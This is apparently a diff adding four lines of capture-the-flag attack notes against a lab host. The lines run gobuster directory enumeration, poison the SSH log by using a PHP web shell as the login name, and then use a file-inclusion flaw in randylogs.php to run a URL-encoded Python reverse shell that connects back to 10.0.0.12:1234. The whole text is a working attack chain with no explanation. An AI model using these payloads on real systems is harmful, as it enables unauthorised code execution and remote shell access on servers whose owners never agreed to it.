@@ -1,0 +1,4 @@
+gobuster dir -u http://10.0.0.137 -x php,html,txt --wordlist=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dir.log
+gobuster dir -u http://10.0.0.137/blog-post -x php,html,txt --wordlist=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dir-blog-post.log
+ssh '<?php system($_GET["cmd"]); ?>'@10.0.0.137
+view-source:http://10.0.0.137/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.0.12%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/sh%22)%27
